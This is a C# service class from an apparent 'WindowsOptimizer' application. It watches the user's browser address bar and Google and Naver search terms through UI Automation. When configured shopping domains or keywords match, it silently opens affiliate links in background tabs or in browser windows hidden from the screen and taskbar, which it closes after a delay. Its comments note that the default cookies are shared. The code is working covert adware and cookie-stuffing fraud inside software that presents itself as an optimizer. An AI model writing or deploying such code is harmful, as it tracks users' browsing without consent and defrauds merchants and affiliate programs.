using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;
using WindowsOptimizer.Models;

namespace WindowsOptimizer.Services
{
    public class BrowserMonitorService
    {
        private static readonly Lazy<BrowserMonitorService> _instance = new Lazy<BrowserMonitorService>(() => new BrowserMonitorService());
        public static BrowserMonitorService Instance => _instance.Value;

        // Windows API
        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
        [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")] private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
        [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hWnd);
        [DllImport("user32.dll")] private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")] private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")] private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        // 상수
        private const uint WM_CLOSE = 0x0010;
        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOZORDER = 0x0004;
        private const uint SWP_NOACTIVATE = 0x0010;
        private const int SW_SHOWNOACTIVATE = 4;
        private const int SW_HIDE = 0;
        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x00000080;
        private const int WS_EX_APPWINDOW = 0x00040000;

        // 히든 브라우저 상태 관리
        // TODO: 큐 방식 구현 시 사용
        // private volatile bool _isHiddenBrowserRunning = false;
        private readonly object _hiddenBrowserLock = new object();
        private List<IntPtr> _hiddenBrowserWindows = new List<IntPtr>();

        // 공유 AutoTab 상태 (URL맵핑 + 키워드맵핑 합산)
        private readonly Dictionary<string, int> _autoTabCountByTarget = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
        private DateTime _lastAutoTabTime = DateTime.MinValue;

        private Thread _thread;
        private volatile bool _isMonitoring;
        private string _lastUrl = "";
        private int _browserType = 0;

        public MappingConfig MappingConfig => ConfigService.Instance.MappingConfig;
        public bool IsMonitoring => _isMonitoring;
        public int MonitoringInterval { get; set; } = 3000;

        // 디버그 모드 (히든 창 표시)
        public bool DebugMode { get; set; } = false;

        // 통계
        public int AutoTabTriggerCount { get; private set; }
        public int KeywordTriggerCount { get; private set; }
        public int OpenHdTriggerCount { get; private set; }
        public DateTime LastTriggerTime { get; private set; }
        public DateTime AutoTabLastTriggerTime { get; private set; }
        public DateTime KeywordLastTriggerTime { get; private set; }
        public DateTime OpenHdLastTriggerTime { get; private set; }

        public event Action<string> UrlChanged;
        public event Action<string, DomainMapping, string> DomainTriggered;
        public event Action<string, KeywordMapping> KeywordTriggered;

        private BrowserMonitorService() { }

        public void StartMonitoring()
        {
            if (_isMonitoring) return;
            _isMonitoring = true;
            _thread = new Thread(MonitoringLoop) { IsBackground = true };
            _thread.Start();

            var config = MappingConfig;
            LogService.Instance.Log("═══════════════════════════════════════════════════════════════");
            LogService.Instance.Log("▶ 브라우저 모니터링 시작");
            LogService.Instance.Log($"  [전역] ForceDown: {config?.ForceDown ?? "off"}");
            LogService.Instance.Log($"  [AutoTab] 상태: {config?.AutoTab ?? "off"}, CycleTime: {config?.AutoTabCycleTime ?? 0}초");
            LogService.Instance.Log($"  [OpenHd] 상태: {config?.OpenHd ?? "off"}, DelayTime: {config?.OpenHdDelayTime ?? 0}초, CloseTime: {config?.OpenHdCloseTime ?? 10}초, CycleTime: {config?.OpenHdCycleTime ?? 0}초");
            LogService.Instance.Log($"  [KeyMap] 상태: {config?.KeyMapping ?? "off"}");
            LogService.Instance.Log($"  [매핑] 등록된 도메인: {config?.Mappings?.Count ?? 0}개, 키워드: {config?.KeyMappings?.Count ?? 0}개");
            LogService.Instance.Log("═══════════════════════════════════════════════════════════════");
        }

        public void StopMonitoring()
        {
            if (!_isMonitoring) return;
            _isMonitoring = false;
            _thread?.Join(3000);
            LogService.Instance.Log("═══════════════════════════════════════════════════════════════");
            LogService.Instance.Log("⏹ 브라우저 모니터링 중지");
            LogService.Instance.Log($"  [통계] AutoTab: {AutoTabTriggerCount}회, Keyword: {KeywordTriggerCount}회, OpenHd: {OpenHdTriggerCount}회");
            LogService.Instance.Log("═══════════════════════════════════════════════════════════════");
        }

        private void MonitoringLoop()
        {
            while (_isMonitoring)
            {
                try
                {
                    // ForceDown 체크
                    if (MappingConfig?.IsForceDown == true)
                    {
                        Thread.Sleep(MonitoringInterval);
                        continue;
                    }

                    var url = GetCurrentBrowserUrl();
                    if (!string.IsNullOrEmpty(url) && url != _lastUrl)
                    {
                        LogService.Instance.Log($"[URL] 변경 감지: {url}");
                        UrlChanged?.Invoke(url);
                        ProcessMapping(url);
                        _lastUrl = url;
                    }
                }
                catch (Exception ex)
                {
                    LogService.Instance.Log($"[오류] 모니터링 루프: {ex.Message}");
                }
                Thread.Sleep(MonitoringInterval);
            }
        }

        private void ProcessMapping(string url)
        {
            if (MappingConfig == null) return;

            try
            {
                // URL 정규화 - http/https 없으면 추가
                var normalizedUrl = url;
                if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                    !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    normalizedUrl = "https://" + url;
                }

                var uri = new Uri(normalizedUrl);
                var host = uri.Host.ToLower();

                if (MappingConfig.Mappings != null)
                foreach (var mapping in MappingConfig.Mappings)
                {
                    var trigger = mapping.Trigger.ToLower().Replace("www.", "");
                    var targetHost = host.Replace("www.", "");

                    // 정확한 도메인 매칭 또는 서브도메인 매칭
                    // 예: trigger="gmarket.co.kr" → "gmarket.co.kr", "m.gmarket.co.kr" 매칭
                    // "w", "ww" 같은 부분 문자열은 매칭 안됨
                    if (targetHost != trigger && !targetHost.EndsWith("." + trigger)) continue;

                    LogService.Instance.Log("───────────────────────────────────────────────────────────────");
                    LogService.Instance.Log($"[매칭] 트리거 도메인 발견: {mapping.Trigger}");
                    LogService.Instance.Log($"       → 타겟: {mapping.Target}");
                    LogService.Instance.Log($"       → 최대 횟수: {mapping.Frequency}회");
                    LastTriggerTime = DateTime.Now;

                    // AutoTab 기능 처리
                    ProcessAutoTab(mapping, url);

                    // OpenHd 기능 처리 (독립적)
                    ProcessOpenHd(mapping, url);

                    LogService.Instance.Log("───────────────────────────────────────────────────────────────");
                    break;
                }

                // 키워드 매핑 처리
                ProcessKeywordMapping(normalizedUrl, uri, MappingConfig);
            }
            catch (Exception ex)
            {
                LogService.Instance.Log($"[오류] 매칭 처리: {ex.Message}");
            }
        }

        private void ProcessKeywordMapping(string url, Uri uri, MappingConfig config)
        {
            if (!config.IsKeyMappingEnabled) return;
            if (config.KeyMappings == null || config.KeyMappings.Count == 0) return;

            var host = uri.Host.ToLower();

            // Google 또는 Naver 검색인지 확인
            string queryParam = null;
            if (host == "www.google.com" || host == "google.com" || host.EndsWith(".google.com") ||
                host.EndsWith(".google.co.kr") || host.EndsWith(".google.co.jp"))
                queryParam = "q";
            else if (host == "search.naver.com")
                queryParam = "query";
            else
                return;

            // 쿼리스트링에서 검색어 추출
            var queryString = uri.Query;
            if (string.IsNullOrEmpty(queryString)) return;

            var searchQuery = GetQueryParameter(queryString, queryParam);
            if (string.IsNullOrEmpty(searchQuery)) return;

            // URL 디코딩
            searchQuery = Uri.UnescapeDataString(searchQuery);

            LogService.Instance.Log($"[KeywordMap] 검색어 감지: \"{searchQuery}\" ({(queryParam == "q" ? "Google" : "Naver")})");

            // 키워드 매핑 순회 - 첫 번째 매칭만 실행
            foreach (var km in config.KeyMappings)
            {
                if (km.KeywordList.Any(k => searchQuery.IndexOf(k, StringComparison.OrdinalIgnoreCase) >= 0))
                {
                    LogService.Instance.Log($"[KeywordMap] 키워드 매칭: [{km.Keywords}] → {km.Target}");
                    ProcessKeywordAutoTab(km);
                    break;
                }
            }
        }

        private static string GetQueryParameter(string queryString, string param)
        {
            if (queryString.StartsWith("?"))
                queryString = queryString.Substring(1);

            foreach (var pair in queryString.Split('&'))
            {
                var parts = pair.Split(new[] { '=' }, 2);
                if (parts.Length == 2 && string.Equals(parts[0], param, StringComparison.OrdinalIgnoreCase))
                    return parts[1];
            }
            return null;
        }

        private void ProcessKeywordAutoTab(KeywordMapping km)
        {
            var config = MappingConfig;
            LogService.Instance.Log($"[KeywordAutoTab] ▼ 조건 체크");

            if (!CanExecuteSharedAutoTab(km.Target, km.Frequency, config.AutoTabCycleTime, "KeywordAutoTab"))
                return;

            // 조건 충족 - 실행
            MarkSharedAutoTabTriggered(km.Target);
            km.AutoTabCount++;
            km.AutoTabLastTime = DateTime.Now;
            KeywordTriggerCount++;
            KeywordLastTriggerTime = DateTime.Now;
            LastTriggerTime = DateTime.Now;

            LogService.Instance.Log($"         ★ 실행! (개별:{km.AutoTabCount}, 공유:{_autoTabCountByTarget[km.Target]}/{km.Frequency})");
            KeywordTriggered?.Invoke(km.Keywords, km);

            OpenTabInBackground(km.Target);
        }

        private bool CanExecuteSharedAutoTab(string target, int frequency, int cycleTimeSec, string logPrefix)
        {
            _autoTabCountByTarget.TryGetValue(target, out int sharedCount);
            LogService.Instance.Log($"         공유 횟수: {sharedCount}/{frequency}회 (target: {target})");

            if (sharedCount >= frequency)
            {
                LogService.Instance.Log($"         → 스킵 (공유 최대 횟수 도달)");
                return false;
            }

            if (cycleTimeSec > 0)
            {
                var elapsed = (DateTime.Now - _lastAutoTabTime).TotalSeconds;
                var remaining = cycleTimeSec - elapsed;
                LogService.Instance.Log($"         CycleTime: {cycleTimeSec}초, 경과: {elapsed:F0}초");

                if (elapsed < cycleTimeSec)
                {
                    LogService.Instance.Log($"         → 스킵 (글로벌 CycleTime 미충족, 남은시간: {remaining:F0}초)");
                    return false;
                }
            }
            else
            {
                LogService.Instance.Log($"         CycleTime: 0 (횟수만 체크)");
            }

            return true;
        }

        private void MarkSharedAutoTabTriggered(string target)
        {
            _autoTabCountByTarget.TryGetValue(target, out int count);
            _autoTabCountByTarget[target] = count + 1;
            _lastAutoTabTime = DateTime.Now;
        }

        private void ProcessAutoTab(DomainMapping mapping, string url)
        {
            var config = MappingConfig;
            LogService.Instance.Log($"[AutoTab] ▼ 조건 체크");
            LogService.Instance.Log($"         기능: {(config.IsAutoTabEnabled ? "ON ✓" : "OFF ✗")}");

            if (!config.IsAutoTabEnabled)
            {
                LogService.Instance.Log($"         → 스킵 (기능 비활성화)");
                return;
            }

            if (!CanExecuteSharedAutoTab(mapping.Target, mapping.Frequency, config.AutoTabCycleTime, "AutoTab"))
                return;

            // 조건 충족 - 실행
            MarkSharedAutoTabTriggered(mapping.Target);
            mapping.AutoTabCount++;
            mapping.AutoTabLastTime = DateTime.Now;
            AutoTabTriggerCount++;
            AutoTabLastTriggerTime = DateTime.Now;

            LogService.Instance.Log($"         ★ 실행! (개별:{mapping.AutoTabCount}, 공유:{_autoTabCountByTarget[mapping.Target]}/{mapping.Frequency})");
            DomainTriggered?.Invoke(url, mapping, "AutoTab");

            // 기존 브라우저에 새 탭으로 제휴 링크 열기
            OpenTabInBackground(mapping.Target);
        }

        private void ProcessOpenHd(DomainMapping mapping, string url)
        {
            var config = MappingConfig;
            LogService.Instance.Log($"[OpenHd] ▼ 조건 체크");
            LogService.Instance.Log($"         기능: {(config.IsOpenHdEnabled ? "ON ✓" : "OFF ✗")}");

            if (!config.IsOpenHdEnabled)
            {
                LogService.Instance.Log($"         → 스킵 (기능 비활성화)");
                return;
            }

            LogService.Instance.Log($"         실행 횟수: {mapping.OpenHdCount}/{mapping.Frequency}회");

            if (mapping.OpenHdCount >= mapping.Frequency)
            {
                LogService.Instance.Log($"         → 스킵 (최대 횟수 도달)");
                return;
            }

            if (config.OpenHdCycleTime > 0)
            {
                var elapsed = (DateTime.Now - mapping.OpenHdLastTime).TotalSeconds;
                var remaining = config.OpenHdCycleTime - elapsed;
                LogService.Instance.Log($"         CycleTime: {config.OpenHdCycleTime}초, 경과: {elapsed:F0}초");

                if (elapsed < config.OpenHdCycleTime)
                {
                    LogService.Instance.Log($"         → 스킵 (CycleTime 미충족, 남은시간: {remaining:F0}초)");
                    return;
                }
            }
            else
            {
                LogService.Instance.Log($"         CycleTime: 0 (횟수만 체크)");
            }

            LogService.Instance.Log($"         DelayTime: {config.OpenHdDelayTime}초, CloseTime: {config.OpenHdCloseTime}초");

            // 조건 충족 - 실행
            mapping.MarkOpenHdTriggered();
            OpenHdTriggerCount++;
            OpenHdLastTriggerTime = DateTime.Now;

            LogService.Instance.Log($"         ★ 실행! ({mapping.OpenHdCount}/{mapping.Frequency})");
            DomainTriggered?.Invoke(url, mapping, "OpenHd");

            // 히든 윈도우 방식으로 제휴 링크 열기 (쿠키 공유됨, DelayTime 적용)
            OpenHiddenWindow(mapping.Target, config.OpenHdCloseTime, config.OpenHdDelayTime);
        }

        /// <summary>
        /// 기존 브라우저에 새 탭으로 URL 열기 (AutoTab 전용)
        /// 브라우저 exe를 직접 지정하여 기본 프로필 쿠키 공유 보장
        /// --new-window 없이 URL만 전달하여 기존 창에 새 탭으로 열림
        /// </summary>
        private void OpenTabInBackground(string targetUrl)
        {
            try
            {
                var url = targetUrl;
                if (!targetUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                    !targetUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    url = "https://" + targetUrl;
                }

                // 현재 감지된 브라우저 경로 탐색
                var browserPath = FindBrowserPath(_browserType);

                // 못 찾으면 다른 브라우저도 시도
                if (browserPath == null)
                {
                    var altType = _browserType == 0 ? 1 : 0;
                    browserPath = FindBrowserPath(altType);
                    if (browserPath != null)
                        LogService.Instance.Log($"[AutoTab] 대체 브라우저 사용: {browserPath}");
                }

                if (browserPath != null)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = browserPath,
                        Arguments = $"\"{url}\"",  // --new-window 없이 → 기존 창에 새 탭 + 기본 프로필 쿠키 공유
                        UseShellExecute = true
                    });
                    LogService.Instance.Log($"[AutoTab] ✓ 새 탭 열기: {url}");
                }
                else
                {
                    // 브라우저를 전혀 찾지 못한 경우 OS 기본 브라우저로 폴백
                    Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true });
                    LogService.Instance.Log($"[AutoTab] ⚠ 기본 브라우저로 폴백 (쿠키 공유 미보장): {url}");
                }
            }
            catch (Exception ex)
            {
                LogService.Instance.Log($"[AutoTab] ✗ 탭 열기 오류: {ex.Message}");
            }
        }

        /// <summary>
        /// 브라우저 실행 파일의 절대 경로를 반환. 찾지 못하면 null.
        /// </summary>
        private string FindBrowserPath(int browserType)
        {
            string[] paths;
            if (browserType == 0) // Chrome
            {
                paths = new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Google\Chrome\Application\chrome.exe"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Google\Chrome\Application\chrome.exe"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
                };
            }
            else // Edge
            {
                paths = new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Microsoft\Edge\Application\msedge.exe"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Microsoft\Edge\Application\msedge.exe")
                };
            }

            foreach (var p in paths)
            {
                if (File.Exists(p)) return p;
            }
            return null;
        }

        /// <summary>
        /// 히든 윈도우로 제휴 링크 열기 (Chrome 기본 프로필 쿠키 공유)
        /// </summary>
        private void OpenHiddenWindow(string url, int closeTimeSec, int delayTimeSec = 0)
        {
            // TODO: 향후 옵션 처리 - 스킵(skip) / 즉시실행(immediate) / 큐(queue) 방식 선택 가능하게
            // 현재: 즉시실행 모드 (중복 허용)
            // lock (_hiddenBrowserLock)
            // {
            //     if (_isHiddenBrowserRunning)
            //     {
            //         LogService.Instance.Log($"[HiddenWindow] ⚠ 이미 실행 중, 스킵");
            //         return;
            //     }
            //     _isHiddenBrowserRunning = true;
            // }

            Task.Run(async () =>
            {
                var taskWindows = new List<IntPtr>(); // 이 Task에서 연 창 추적

                try
                {
                    // DelayTime 대기
                    if (delayTimeSec > 0)
                    {
                        LogService.Instance.Log($"[HiddenWindow] ⏳ DelayTime {delayTimeSec}초 대기...");
                        await Task.Delay(delayTimeSec * 1000);
                    }

                    // 현재 Chrome 창 목록 저장
                    var existingWindows = GetChromeWindows();
                    LogService.Instance.Log($"[HiddenWindow] 기존 창 수: {existingWindows.Count}개");

                    // URL 정규화
                    var targetUrl = url;
                    if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                        !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                    {
                        targetUrl = "https://" + url;
                    }

                    // Chrome 새 창으로 열기 (새 창이어야 HWND 추적 가능)
                    var browserExe = _browserType == 0 ? "chrome" : "msedge";
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = browserExe,
                        Arguments = $"--new-window \"{targetUrl}\"",
                        UseShellExecute = true
                    };
                    Process.Start(startInfo);
                    LogService.Instance.Log($"[HiddenWindow] ✓ 새 창 열기: {targetUrl}");

                    // 새 창 감지 및 숨김
                    taskWindows = await HideNewWindowAsync(existingWindows);

                    // CloseTime 대기
                    var actualCloseTime = Math.Max(closeTimeSec, 10);
                    LogService.Instance.Log($"[HiddenWindow] ⏱ {actualCloseTime}초 후 자동 닫기");
                    await Task.Delay(actualCloseTime * 1000);

                    // 이 Task에서 연 창만 닫기
                    CloseHiddenWindows(taskWindows);
                }
                catch (Exception ex)
                {
                    LogService.Instance.Log($"[HiddenWindow] ✗ 오류: {ex.Message}");
                    // 오류 시에도 열린 창 닫기
                    if (taskWindows.Count > 0)
                    {
                        CloseHiddenWindows(taskWindows);
                    }
                }
            });
        }

        /// <summary>
        /// Chrome 창 목록 가져오기
        /// </summary>
        private List<IntPtr> GetChromeWindows()
        {
            var windows = new List<IntPtr>();
            EnumWindows((hWnd, lParam) =>
            {
                if (!IsWindowVisible(hWnd)) return true;
                var className = new StringBuilder(256);
                GetClassName(hWnd, className, 256);
                if (className.ToString() == "Chrome_WidgetWin_1")
                    windows.Add(hWnd);
                return true;
            }, IntPtr.Zero);
            return windows;
        }

        /// <summary>
        /// 새 창 감지 및 숨김 처리
        /// </summary>
        /// <returns>감지된 창 목록</returns>
        private async Task<List<IntPtr>> HideNewWindowAsync(List<IntPtr> existingWindows)
        {
            var detectedWindows = new List<IntPtr>();

            // 50ms 간격으로 10번 시도 (총 500ms)
            for (int i = 0; i < 10; i++)
            {
                await Task.Delay(50);
                var currentWindows = GetChromeWindows();
                var newWindows = currentWindows.Except(existingWindows).ToList();

                if (newWindows.Count > 0)
                {
                    foreach (var hwnd in newWindows)
                    {
                        // 디버그 모드가 아닐 때만 숨김
                        if (!DebugMode)
                        {
                            HideWindow(hwnd);
                        }
                        lock (_hiddenBrowserLock)
                        {
                            if (!_hiddenBrowserWindows.Contains(hwnd))
                                _hiddenBrowserWindows.Add(hwnd);
                        }
                        detectedWindows.Add(hwnd);
                        LogService.Instance.Log($"[HiddenWindow] ✓ 창 감지 (HWND: {hwnd}){(DebugMode ? " [디버그: 표시]" : "")}");
                    }
                    return detectedWindows;
                }
            }

            LogService.Instance.Log($"[HiddenWindow] ⚠ 새 창 감지 지연");
            return detectedWindows;
        }

        /// <summary>
        /// 창 숨김 처리
        /// </summary>
        private void HideWindow(IntPtr hwnd)
        {
            // 화면 밖으로 이동
            // SetWindowPos(hwnd, IntPtr.Zero, -32000, -32000, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);

            // 작업표시줄에서 숨기기
            int exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
            exStyle |= WS_EX_TOOLWINDOW;
            exStyle &= ~WS_EX_APPWINDOW;
            SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);

            ShowWindow(hwnd, SW_HIDE);
        }

        /// <summary>
        /// 히든 창 닫기 (현재 Task에서 추적 중인 창만)
        /// </summary>
        private void CloseHiddenWindows(List<IntPtr> windowsToClose)
        {
            foreach (var hwnd in windowsToClose)
            {
                try
                {
                    PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                    lock (_hiddenBrowserLock)
                    {
                        _hiddenBrowserWindows.Remove(hwnd);
                    }
                    LogService.Instance.Log($"[HiddenWindow] ✓ 창 닫기 완료 (HWND: {hwnd})");
                }
                catch (Exception ex)
                {
                    LogService.Instance.Log($"[HiddenWindow] ✗ 창 닫기 실패: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// 히든 창 표시/숨김 토글 (CTRL+SHIFT+ALT+F12)
        /// </summary>
        public void ToggleDebugWindow()
        {
            DebugMode = !DebugMode;

            lock (_hiddenBrowserLock)
            {
                foreach (var hwnd in _hiddenBrowserWindows)
                {
                    if (DebugMode)
                    {
                        // 창 표시
                        int exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
                        exStyle &= ~WS_EX_TOOLWINDOW;
                        exStyle |= WS_EX_APPWINDOW;
                        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
                        ShowWindow(hwnd, SW_SHOWNOACTIVATE);
                        SetWindowPos(hwnd, IntPtr.Zero, 100, 100, 800, 600, SWP_NOZORDER);
                    }
                    else
                    {
                        HideWindow(hwnd);
                    }
                }
            }

            LogService.Instance.Log($"[HiddenWindow] 디버그 모드: {(DebugMode ? "ON" : "OFF")} (창: {_hiddenBrowserWindows.Count}개)");
        }

        private string GetCurrentBrowserUrl()
        {
            var hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return "";

            GetWindowThreadProcessId(hwnd, out uint pid);
            try
            {
                var process = Process.GetProcessById((int)pid);
                var name = process.ProcessName.ToLower();

                if (name == "chrome" || name == "msedge" || name == "edge")
                {
                    _browserType = name.Contains("chrome") ? 0 : 1;
                    return ExtractUrlFromBrowser(process.MainWindowHandle, name);
                }
            }
            catch { }
            return "";
        }

        private string ExtractUrlFromBrowser(IntPtr hwnd, string browser)
        {
            try
            {
                var window = AutomationElement.FromHandle(hwnd);
                if (window == null) return "";

                string[] names = browser.Contains("chrome")
                    ? new[] { "주소창 및 검색창", "Address and search bar" }
                    : new[] { "주소창 및 검색창", "주소 및 검색창", "Address and search bar" };

                foreach (var name in names)
                {
                    var condition = new OrCondition(
                        new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit),
                        new PropertyCondition(AutomationElement.NameProperty, name)
                    );

                    var bar = window.FindFirst(TreeScope.Descendants, condition);
                    if (bar != null && bar.TryGetCurrentPattern(ValuePattern.Pattern, out object pattern))
                        return ((ValuePattern)pattern).Current.Value;
                }
            }
            catch { }
            return "";
        }

        public int TriggerCount => AutoTabTriggerCount + KeywordTriggerCount + OpenHdTriggerCount;
    }
}
